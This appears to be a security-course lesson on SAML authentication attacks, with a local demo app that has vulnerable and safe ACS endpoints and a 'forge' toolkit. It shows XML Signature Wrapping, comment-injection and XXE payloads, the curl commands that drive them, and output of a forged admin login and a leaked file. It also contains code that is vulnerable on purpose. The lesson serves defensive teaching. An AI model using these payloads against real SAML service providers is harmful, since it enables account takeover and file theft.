# 59. SAML Attacks

## Notes

### What is a SAML attack?

In SAML SSO (topic 58), the IdP (Okta, Azure AD, Keycloak) signs an **XML assertion** that says "this is Priya", and the browser carries it to your app (the SP). A **SAML attack** is any trick that gets your SP to accept an assertion the attacker **made or changed**, so he logs in as someone else, usually an admin.

Topic 58 showed the happy path. This topic shows **how attackers break SAML verification**, with every attack run against a real vulnerable SP.

> **One-line answer:** almost every SAML attack works because the SP **checks one part of the XML but reads another part**, or **trusts the message to say how to check it**. Fix: reject `DOCTYPE`, require **exactly one signed Assertion**, verify it with the **IdP key you pinned at setup**, then read **only from the element you verified**, and check `Audience`, `Recipient`, `Destination`, the time window, `InResponseTo` and replay. Use a maintained library and keep it patched.

---

### Why it matters

| Attack | What the attacker does | Result |
|---|---|---|
| **Signature stripping** | Deletes `<ds:Signature>` and changes the name | SP that checks "only if a signature is there" accepts anything |
| **Self-signed assertion** | Signs with **his own** key and puts it in `<ds:KeyInfo>` | SP that trusts the key inside the message accepts it |
| **XML Signature Wrapping (XSW)** | Keeps the real signed assertion, adds an **unsigned fake** one | Signature checks the real one, the app reads the fake one |
| **Comment injection** | `priya@chaicart.in<!---->.evil.dev` | Signature still valid, SP reads only `priya@chaicart.in` |
| **XXE** | Adds a `<!DOCTYPE>` that loads a local file or URL | Reads server files, SSRF, or a "billion laughs" crash |
| **Missing checks** | Replays an old response, or one made **for another app** | Old or wrong assertions still log in |

SAML is old, XML is complicated, and **real libraries shipped every one of these**: XSW was found in 11 of 14 SAML frameworks in 2012 ("On Breaking SAML"), comment injection hit `python-saml`, `ruby-saml`, OneLogin and others in 2018 (CVE-2017-11427 to 11430, found by Duo), and `ruby-saml` had signature bypasses again in 2024 and 2025 (CVE-2024-45409, CVE-2025-25291/25292). A SAML bypass = **login as anyone, including admins, with no password**.

---

### Real-life example: the company visitor letter 📄

Priya is the HR head at ChaiCart. To enter the HR office, you show a **letter from the main reception** (the IdP) with the reception's **stamp**.

1. Vikram tears off the stamp and writes "Priya" on the letter → **signature stripping**. A good guard says "no stamp, no entry".
2. He stamps it with **his own** stamp, and staples a note "this is what a real stamp looks like" → **self-signed assertion**. A good guard compares with the stamp sample **she already has**.
3. He staples a fake page saying "Priya" **on top of** his real stamped letter. The guard checks the stamp (on page 2) but reads the name on page 1 → **XSW**.
4. His real letter says "priya@chaicart.in.evil.dev". He covers ".evil.dev" with a sticky note. The stamp is still real → **comment injection**.
5. He shows yesterday's letter, or a letter for **the canteen** → **replay / wrong audience**.
6. Fix: the guard checks the stamp against **her own sample**, accepts exactly **one page**, reads the name from **that same page**, and checks the date, "to: HR office", and that she was expecting him.

---

### How the attacks fit together

#### 📊 Diagrams

Open **[diagrams.html](diagrams.html)** in your browser (just double-click the file) to see:

- **Flow diagram**: every decision an SP makes about a SAMLResponse, and which attack wins at each bad answer
- **Data flow**: Vikram turning his own valid login into Priya's with XSW, against both ACS endpoints (real values from the demo)
- **XSW vs comment injection**: what the signature "sees" and what the app "reads"

In short: `attacker logs in as himself → gets a real signed SAMLResponse → edits the XML (strip, re-sign, wrap, comment, DOCTYPE) → vulnerable SP checks one thing and reads another → logged in as Priya. Safe SP: no DOCTYPE → exactly 1 Assertion → pinned key → read only that Assertion → audience, recipient, time, InResponseTo, replay → rejects`

A SAMLResponse (simplified). **Every byte of it passed through the attacker's browser**:

```xml
<samlp:Response Destination="http://localhost:3159/acs" InResponseTo="_74cd…">
  <saml:Issuer>chaicart-idp</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="…:Success"/></samlp:Status>
  <saml:Assertion ID="_2de7…">                                  ← the signed part
    <saml:Issuer>chaicart-idp</saml:Issuer>
    <ds:Signature>
      <ds:SignedInfo><ds:Reference URI="#_2de7…"><ds:DigestValue>…</ds:DigestValue></ds:Reference></ds:SignedInfo>
      <ds:SignatureValue>…</ds:SignatureValue>
      <ds:KeyInfo>…a public key or certificate…</ds:KeyInfo>     ← attacker input!
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>rahul@chaicart.in</saml:NameID>                 ← WHO
      <saml:SubjectConfirmation Method="…:bearer">
        <saml:SubjectConfirmationData InResponseTo="_74cd…" Recipient="http://localhost:3159/acs" NotOnOrAfter="…"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="…" NotOnOrAfter="…">
      <saml:AudienceRestriction><saml:Audience>chaicart-hr</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
  </saml:Assertion>
</samlp:Response>
```

How the signature works (XML-DSig):

1. Take the `Assertion`, remove the `Signature` inside it, write it in **canonical form** (c14n: attributes sorted, **comments dropped**).
2. `DigestValue = SHA-256(canonical assertion)`, stored in `<ds:Reference URI="#id">`.
3. `SignatureValue = RSA-sign(canonical SignedInfo)` with the IdP's private key.

So the signature protects **the element with that ID**, in canonical form. Not "the document". That gap is where most attacks live.

---

### Attack 1: Signature stripping

```js
const sig = findAll(doc, "ds:Signature")[0];
if (sig) { verify(sig); }          // ❌ no signature → no check
```

Vikram deletes `<ds:Signature>` and writes `priya@chaicart.in`. The code skips verification entirely.

**Fix:** the assertion **must** be signed. No signature = reject.

```js
const sig = child(assertion, "ds:Signature");
if (!sig) throw new Error("the Assertion is not signed");   // ✅
```

Also watch for config like `wantAssertionsSigned: false`. Some libraries only check that **the Response or the Assertion** is signed; make sure the **Assertion** (the part with the identity) is.

---

### Attack 2: Self-signed assertion (trusting `KeyInfo`)

`<ds:KeyInfo>` says "here's the key/certificate that signed this". If the SP verifies with **that** key:

```js
const key = keyFrom(sig.KeyInfo);   // ❌ the attacker's key, from the attacker's message
verify(sig, key);                    // ✅ valid... because he signed it himself
```

Vikram makes his own key pair, changes the name, re-signs, and puts **his** public key in `KeyInfo`. It's the same bug as JWT `jwk` / `jku` injection (topic 53).

**Fix:** pin the IdP's signing key/certificate **at setup time**, from the IdP's metadata (topic 58). Ignore `KeyInfo`, or only use it to pick between keys **you already trust** (by exact fingerprint).

---

### Attack 3: XML Signature Wrapping (XSW)

The most famous SAML attack. Vikram doesn't break the signature at all. He **adds** a fake assertion:

```xml
<samlp:Response>
  <saml:Assertion ID="_1793…">                 ← FAKE, unsigned: NameID priya@chaicart.in
  <saml:Assertion ID="_2de7…">                 ← REAL, signed:   NameID priya@chaicart.in.evil.dev
    <ds:Signature><ds:Reference URI="#_2de7…"/>…</ds:Signature>
```

The vulnerable code:

```js
checkSignature(sig, key, elementWithId(refUri(sig)));   // checks _2de7… (real, valid ✓)
const assertion = findAll(doc, "saml:Assertion")[0];    // ❌ reads _1793… (fake)
```

**Two different pieces of code** answer "which assertion?": the signature checker follows the ID, the app takes the first one. There are many XSW variants (fake one first, last, wrapped inside `<Extensions>` or `<ds:Object>`, duplicate IDs…), and they all exploit that gap.

**Fix:** "**verify what you use, use what you verified**":

```js
const assertions = findAll(doc, "saml:Assertion");                      // at ANY depth
if (assertions.length !== 1) throw new Error("expected exactly 1 Assertion");
const [assertion] = assertions;
if (refUri(sig) !== `#${assertion.attrs.ID}`) throw new Error("signature does not cover this Assertion");
checkSignature(sig, IDP_PINNED_KEY, assertion);
// from here on, read ONLY from `assertion`
```

Also: validate the XML against the SAML schema, and never search the document again by ID or XPath after verifying.

---

### Attack 4: Comment injection (CVE-2017-11427 and friends)

Vikram owns `evil.dev`, so he can register `priya@chaicart.in.evil.dev` at the IdP (a partner/guest account). The IdP signs it honestly. Then he edits:

```xml
<saml:NameID>priya@chaicart.in<!---->.evil.dev</saml:NameID>
```

- **Signature:** c14n drops comments, so the canonical text is still `priya@chaicart.in.evil.dev`. **Valid.**
- **Vulnerable code** reads the **first text node**: `priya@chaicart.in`. Logged in as Priya.

```js
nameId.children.find((c) => c.type === "text").value;   // ❌ "priya@chaicart.in"
textOf(nameId);                                          // ✅ "priya@chaicart.in.evil.dev" (all text nodes)
```

**Fix:** read the **full** text content (all text nodes, comments skipped), and use a patched library. The safe SP then sees the real name, and returns **403: no HR account** for it.

---

### Attack 5: XXE (XML External Entities)

XML has a `DOCTYPE` that can define **entities**, including ones loaded from files or URLs:

```xml
<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:package.json">]>
<samlp:Response><saml:Issuer>&xxe;</saml:Issuer></samlp:Response>
```

A parser that expands it puts the **file's content** into the Issuer. The SP's error `Unknown issuer "…"` echoes it back. In real life: `/etc/passwd`, `.env`, cloud credentials, or `http://169.254.169.254` (SSRF). It happens **before** any signature check, so no valid login is needed.

The cousin is **"billion laughs"**: entities that expand to entities that expand… 1 KB of XML becomes gigabytes in memory.

**Fix:** a SAML message never needs a `DOCTYPE`. **Reject it**, and turn off external entities in your XML parser.

---

### Attack 6: Missing checks (replay, wrong app, expired, unsolicited)

A valid IdP signature only means "**the IdP said this, once, to someone**". Without these checks:

| Check | Attack it stops |
|---|---|
| `Audience` = our entity ID, `Destination` / `Recipient` = our ACS | An assertion made for **another app** (`chai-blog`) is used at HR. A malicious or hacked SP can replay its users' assertions to you. |
| `NotBefore` / `NotOnOrAfter` (+ small clock skew) | An **old** assertion from browser history, logs or a proxy works forever |
| Assertion **ID never seen before** (cache until it expires) | The **same** response is posted twice (replay) |
| `InResponseTo` = a login **we started** (one-time) | **Unsolicited** responses: login CSRF, injected responses |

IdP-initiated SSO (clicking a tile on the Okta dashboard) has **no** `InResponseTo`. If you must support it, the replay cache and short lifetime are your only defenses, so many teams turn it off.

---

### ✅ The safe ACS, step by step

```js
function verifySafe(xml) {
  const doc = parseXml(xml);                                      // 1. no DOCTYPE (XXE, billion laughs)
  check(doc.attrs.Destination === ACS_URL, status === Success);
  const assertions = findAll(doc, "saml:Assertion");              // 2. exactly ONE, signed,
  if (assertions.length !== 1) throw …;                           //    signature covers THAT one,
  const sig = child(assertion, "ds:Signature"); if (!sig) throw …;//    pinned key, KeyInfo ignored
  if (refUri(sig) !== `#${assertion.attrs.ID}`) throw …;
  checkSignature(sig, IDP_PINNED_KEY, assertion);
  check(issuer, time window, Audience, Recipient);                // 3. read ONLY from `assertion`
  check(ID not used, InResponseTo pending → consume);             // 4. one use only
  return textOf(nameId);                                          // 5. FULL text of NameID
}
```

| ✅ Do | ❌ Don't |
|---|---|
| Use a maintained library (`@node-saml/node-saml`, `samlify`), **patched** | Write your own XML-DSig "because it's just XML" |
| Pin the IdP signing cert from metadata | Trust `<ds:KeyInfo>` from the message |
| Require the **Assertion** to be signed | Verify "if a signature is present" |
| Exactly one Assertion, read from the verified element | `getElementsByTagName("Assertion")[0]` after verifying |
| Full text content of `NameID` | First text node |
| Reject `DOCTYPE`, no external entities | Default XML parser settings |
| Check Audience, Recipient, Destination, time, InResponseTo | Trust any valid signature |
| Cache assertion IDs until they expire | Accept the same response twice |
| Map NameID → **your own** user table and roles | Give admin because the assertion says `role=admin` from an IdP many tenants share |
| Generic error to the user, details in the log | Echo XML content in error pages |

---

### 🤔 Tricky parts

**1. "The signature is valid" ≠ "this login is valid".** A signature proves the IdP signed **some element, once**. Which element, for which app, when, and whether you've seen it are separate checks.

**2. Two parsers = two truths.** If one library verifies the signature and different code reads the NameID (or the same document is parsed twice), they can disagree. This caused CVE-2025-25291/25292 in `ruby-saml` (two XML parsers saw different documents). Use one parsed tree, one verified element.

**3. Namespaces and prefixes.** `<saml:Assertion>` and `<foo:Assertion xmlns:foo="…assertion">` are the **same** element to a real XML parser. Code that looks for the literal string `saml:Assertion` can be fooled. Our demo uses literal names for simplicity; real libraries match by namespace URI.

**4. NameID matching.** `Priya@ChaiCart.in` vs `priya@chaicart.in`, or a NameID format change (email → persistent ID) can create a second account or match the wrong one. Match on a stable, unique ID, and be careful when one IdP serves many organizations (topic 65): check the Issuer **and** the NameID together.

**5. Encrypted assertions** (`EncryptedAssertion`) hide the content from the browser, but **don't** replace the signature. Decrypt, then verify the decrypted assertion.

**6. RelayState is an open redirect.** After login, SPs redirect to `RelayState`. Only allow your own paths (topic 42 has the same issue with `returnTo`).

**7. Key rotation.** IdP certificates expire. Keep the **next** cert pinned ahead of time (metadata can list two), or SSO breaks for everyone on rotation day (topic 54).

---

### Common beginner mistakes

1. **Verifying the signature only if one exists.**
   Unsigned assertion = reject.

2. **Using the certificate from `<ds:KeyInfo>`.**
   Pin the IdP's cert from metadata.

3. **Verifying one element and reading another** (`[0]` after verify).
   Exactly one Assertion; read only from the verified element.

4. **Reading the NameID's first text node.**
   Read the full text content; patch your library.

5. **Leaving DTDs / external entities on.**
   Reject any `DOCTYPE`.

6. **Not checking `Audience` / `Recipient` / `Destination`.**
   Otherwise any app on the same IdP can log in to yours.

7. **No replay cache, no `InResponseTo` check.**
   A response from browser history works again.

8. **Ignoring `NotOnOrAfter`, or a huge clock skew** ("5 hours, to be safe").
   A minute or two is enough.

9. **Trusting roles from the assertion blindly.**
   Fine for your own IdP, but map to your own table when the IdP is shared or user-editable.

10. **Never updating the SAML library.**
    SAML bypass CVEs appear every year. Watch advisories.

---

### Interview questions

1. **What is XML Signature Wrapping?**
   The attacker keeps the legitimately signed assertion (so the signature still verifies) and inserts a forged, unsigned assertion elsewhere in the document. If the signature check follows the `Reference URI` but the application reads a different element (for example the first `Assertion`), the forged one is used. Fix: exactly one assertion, and use the exact element that was verified.

2. **How does the comment-injection attack work?**
   Canonicalization drops comments, so `user@a.com<!---->.evil.com` has the same signature as `user@a.com.evil.com`. A library that reads only the first text node gets `user@a.com`. The attacker needs a legitimate account whose name has the victim's name as a prefix.

3. **Why must the IdP certificate be pinned?**
   `KeyInfo` comes inside the message, so an attacker can sign with his own key and include his own certificate. The SP must verify with the key it got from the IdP's metadata out of band.

4. **What is XXE and why does it affect SAML?**
   SAML is XML posted by the browser. A `DOCTYPE` with external entities can make the parser read local files or make network requests, before any signature check. Reject DTDs.

5. **A SAMLResponse has a valid signature. What else do you check?**
   Issuer, Destination, Audience, Recipient, `NotBefore`/`NotOnOrAfter`, `InResponseTo` matches a request we sent, the assertion ID hasn't been used, and status is Success.

6. **What's the risk of IdP-initiated SSO?**
   There's no `InResponseTo`, so the SP can't tell whether it asked for the login. That enables login CSRF and makes stolen responses easier to replay. Use SP-initiated where possible; otherwise a strict replay cache and short lifetime.

7. **SAML or OIDC for a new app?**
   OIDC (JSON/JWT) is simpler and has fewer parser traps. SAML is still needed for many enterprise customers. Either way, use a mature library (topic 60).

8. **You find an XSW bug in production. What do you do?**
   Patch/upgrade the library, check logs for logins where NameID doesn't match the assertion that was signed or unusual admin logins, invalidate sessions, and add the safe checks above as tests.

---

### Quick recap

- The SAMLResponse passes through the browser: **all of it is attacker input**, including `KeyInfo` and `DOCTYPE`
- **Signature stripping** → assertion must be signed. **Self-signed** → pinned IdP cert, ignore `KeyInfo`
- **XSW** → exactly one Assertion, read only from the element you verified
- **Comment injection** → full text of NameID, patched library
- **XXE** → reject `DOCTYPE`
- **Replay / wrong app / old / unsolicited** → Audience, Recipient, Destination, time window, ID cache, `InResponseTo`
- Use a maintained library and update it. Next: OIDC SSO with Okta, Azure AD, Auth0, Keycloak (topic 60)

## Code

A small **Express** app with **three servers in one file**:

- **ChaiCart HR** (the SP, on `PORT`): `/login` starts SP-initiated SSO, and the SAMLResponse can be posted to **two ACS endpoints**:
  - `/vulnerable/acs`: every bug from the notes (DOCTYPE allowed, "verify if signed", trusts `KeyInfo`, reads the first Assertion and the first text node, no audience/time/replay checks)
  - `/acs`: the safe version (steps 1–5 above)
- **ChaiCart IdP** (on `PORT + 1`): a login form at `/sso`, signs real XML-DSig assertions (RSA-SHA256), publishes its key at `/metadata`. It knows two apps: `chaicart-hr` and `chai-blog`.
- **Vikram's toolkit** (on `PORT + 2`): `POST /forge/:attack` (`strip`, `selfsigned`, `xsw`, `comment`, `xxe`). It only starts from **his own** valid SAMLResponse.

To show every trick, the file has a tiny **from-scratch XML parser, canonicalizer and XML-DSig** (no dependencies besides Express). Never do this in a real app: use a maintained SAML library. At every start a **self-check** runs every attack against both ACS endpoints and stops the server if any result is wrong. Everything is in memory, and the keys are new on every start.

📄 **Full code: [server.js](server.js)**. Open it and read the comments: the ❌ lines are the bugs, the ✅ lines are the fixes.

Install the dependencies once (from this folder), then start the server:

```bash
npm install
```

```bash
node server.js
```

> Port 3000 busy? Run it on another port: `PORT=3159 node server.js` (Git Bash). The IdP then runs on 3160 and Vikram's toolkit on 3161. The outputs below were recorded on port 3159.

You should see:

```
🏢 ChaiCart HR (SP) on http://localhost:3159   ACS: /acs ✅  /vulnerable/acs ❌
🔐 ChaiCart IdP on http://localhost:3160   (login: /sso, metadata: /metadata)
😈 Attacker toolkit on http://127.0.0.1:3161   (POST /forge/:attack)
✅ Self-check passed: strip, self-signed, XSW, comment, XXE, replay, wrong-audience and expired attacks behave as expected
```

**In a browser:** open `http://localhost:3159`, click "Log in with company SSO", log in as Rahul. The IdP's auto-submitting form posts the SAMLResponse to `/acs`.

### Try it (Git Bash)

```bash
SP=http://localhost:3159
IDP=http://localhost:3160
EVIL=http://127.0.0.1:3161
json() { node -pe "JSON.parse(require('fs').readFileSync(0)).$1"; }
sso() { LOC=$(curl -s -o /dev/null -w '%{redirect_url}' $SP/login); curl -s -X POST "$LOC" -H "Content-Type: application/json" -d "{\"email\":\"$1\",\"password\":\"$2\"}" | json SAMLResponse; }
acs() { curl -s $SP$1 --data-urlencode "SAMLResponse=$2"; echo; }
```

- `sso EMAIL PASSWORD` does a full SP-initiated login: `/login` → 302 to the IdP with a `SAMLRequest` → log in → prints a fresh SAMLResponse (base64).
- `acs PATH RESPONSE` posts it to an ACS, like the browser's auto-submitting form.

IdP accounts: **rahul@chaicart.in** / **rahul-pass-11** (employee), **priya@chaicart.in** / **priya-admin-77** (HR admin), and Vikram's partner account **priya@chaicart.in.evil.dev** / **vikram-pass-99**. ChaiCart HR has its own table: only Rahul and Priya have HR accounts.

🔑 **① A real login** (Rahul):

```bash
R=$(sso rahul@chaicart.in rahul-pass-11)
echo $R | base64 -d | head -c 300; echo
acs /acs "$R"
```
→
```
<?xml version="1.0" encoding="UTF-8"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_baadd911…" Version="2.0" IssueInstant="2026-11-06T06:33:20.073Z" Destination="http://localhost:3159/acs" InResponseTo="_74cd16e8…">…
{"message":"Welcome to ChaiCart HR, rahul@chaicart.in","role":"employee"}
```

🔁 **② Replay** the same response:

```bash
acs /acs "$R"
acs /vulnerable/acs "$R"
```
→
```
{"error":"SAML login failed","debugReason":"Assertion _b38e5ec9062cf782ac28024e59ceb7f3 was already used (replay)"}   ✅ safe
{"message":"Welcome to ChaiCart HR, rahul@chaicart.in","role":"employee"}                                            ❌ vulnerable
```

🚫 **③ Vikram's own login** is valid, but he has no HR account:

```bash
acs /acs "$(sso priya@chaicart.in.evil.dev vikram-pass-99)"
```
→ `{"error":"No ChaiCart HR account for priya@chaicart.in.evil.dev"}`

😈 **④ Attacks 1–4.** Each one takes a fresh, valid SAMLResponse from Vikram's own login and sends the forged result to both ACS endpoints:

```bash
for ATTACK in strip selfsigned xsw comment; do
  F=$(curl -s $EVIL/forge/$ATTACK -H "Content-Type: application/json" -d "{\"SAMLResponse\":\"$(sso priya@chaicart.in.evil.dev vikram-pass-99)\"}" | json SAMLResponse)
  echo "-- $ATTACK"
  acs /vulnerable/acs "$F"
  acs /acs "$F"
done
```
→
```
-- strip
{"message":"Welcome to ChaiCart HR, priya@chaicart.in","role":"admin","salaries":["rahul@chaicart.in: ₹14,00,000","priya@chaicart.in: ₹32,00,000"]}
{"error":"SAML login failed","debugReason":"the Assertion is not signed"}
-- selfsigned
{"message":"Welcome to ChaiCart HR, priya@chaicart.in","role":"admin","salaries":["rahul@chaicart.in: ₹14,00,000","priya@chaicart.in: ₹32,00,000"]}
{"error":"SAML login failed","debugReason":"signature is not valid for the IdP's key"}
-- xsw
{"message":"Welcome to ChaiCart HR, priya@chaicart.in","role":"admin","salaries":["rahul@chaicart.in: ₹14,00,000","priya@chaicart.in: ₹32,00,000"]}
{"error":"SAML login failed","debugReason":"expected exactly 1 Assertion, found 2"}
-- comment
{"message":"Welcome to ChaiCart HR, priya@chaicart.in","role":"admin","salaries":["rahul@chaicart.in: ₹14,00,000","priya@chaicart.in: ₹32,00,000"]}
{"error":"No ChaiCart HR account for priya@chaicart.in.evil.dev"}
```

Note the **comment** row: the safe ACS **accepts** the signature (it really is valid) but reads the **whole** name, so Vikram is just Vikram.

🔍 **Look inside** the forged XML (`V` = one of Vikram's responses):

```bash
V=$(sso priya@chaicart.in.evil.dev vikram-pass-99)
curl -s $EVIL/forge/comment -H "Content-Type: application/json" -d "{\"SAMLResponse\":\"$V\"}" | json SAMLResponse | base64 -d | grep -o '<saml:NameID[^>]*>[^/]*</saml:NameID>'
curl -s $EVIL/forge/xsw -H "Content-Type: application/json" -d "{\"SAMLResponse\":\"$V\"}" | json SAMLResponse | base64 -d | grep -o '<saml:Assertion [^>]*ID="[^"]*"\|<saml:NameID[^>]*>[^<]*\|<ds:Reference URI="[^"]*"'
```
→
```
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">priya@chaicart.in<!---->.evil.dev</saml:NameID>

<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1793541322f04f09550dbed832e78f46"     ← fake, first
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">priya@chaicart.in
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_2de71c1320ab134a122d27ecff389617"     ← real, signed
<ds:Reference URI="#_2de71c1320ab134a122d27ecff389617"                                                        ← points at the real one
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">priya@chaicart.in.evil.dev
```

📂 **⑤ Attack 5: XXE.** No login needed at all:

```bash
X=$(curl -s -X POST $EVIL/forge/xxe -H "Content-Type: application/json" -d '{}' | json SAMLResponse)
echo $X | base64 -d; echo
acs /vulnerable/acs "$X"
acs /acs "$X"
```
→
```
<?xml version="1.0"?><!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:package.json">]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_f4e7…"><saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer></samlp:Response>
{"error":"SAML login failed","debugReason":"Unknown issuer \"{\n  \"name\": \"59-saml-attacks\",\n  \"private\": true,\n  \"scripts\": {\n    \"start\": \"node server.js\"\n  },\n  \"dependencies\": {\n    \"express\": \"^5.1.0\"\n  }\n}\n\""}   ❌ file leaked
{"error":"SAML login failed","debugReason":"XML: DOCTYPE is not allowed (it enables XXE and entity bombs)"}                                                                    ✅
```

(The demo's vulnerable parser only reads files inside this folder, so it can't leak your real files.)

🏷️ **⑥ Wrong app.** Priya logs in to **chai-blog** from the IdP dashboard (IdP-initiated). The blog's owner forwards her SAMLResponse to HR:

```bash
B=$(curl -s -X POST "$IDP/sso?sp=chai-blog" -H "Content-Type: application/json" -d '{"email":"priya@chaicart.in","password":"priya-admin-77"}' | json SAMLResponse)
acs /vulnerable/acs "$B"
acs /acs "$B"
```
→
```
{"message":"Welcome to ChaiCart HR, priya@chaicart.in","role":"admin","salaries":["rahul@chaicart.in: ₹14,00,000","priya@chaicart.in: ₹32,00,000"]}   ❌
{"error":"SAML login failed","debugReason":"Destination is \"http://chai-blog.localhost/acs\", not our ACS"}                                            ✅
```

(Even if he edited `Destination`, the signed `Audience` says `chai-blog` and `Recipient` says the blog's ACS. Expired assertions are tested in the self-check.)

📋 **⑦ The server log** shows each rejection:

```
❌ /acs rejected a SAMLResponse: Assertion _b38e5ec9062cf782ac28024e59ceb7f3 was already used (replay)
❌ /acs rejected a SAMLResponse: the Assertion is not signed
❌ /acs rejected a SAMLResponse: signature is not valid for the IdP's key
❌ /acs rejected a SAMLResponse: expected exactly 1 Assertion, found 2
❌ /vulnerable/acs rejected a SAMLResponse: Unknown issuer "{
❌ /acs rejected a SAMLResponse: XML: DOCTYPE is not allowed (it enables XXE and entity bombs)
❌ /acs rejected a SAMLResponse: Destination is "http://chai-blog.localhost/acs", not our ACS
```

> **Windows PowerShell users:** the helper functions, `$(…)` and `base64 -d` work in Git Bash. In PowerShell, use Git Bash (or the browser flow above), or set the port with `$env:PORT=3159; node server.js`. Restart the server to get new keys.
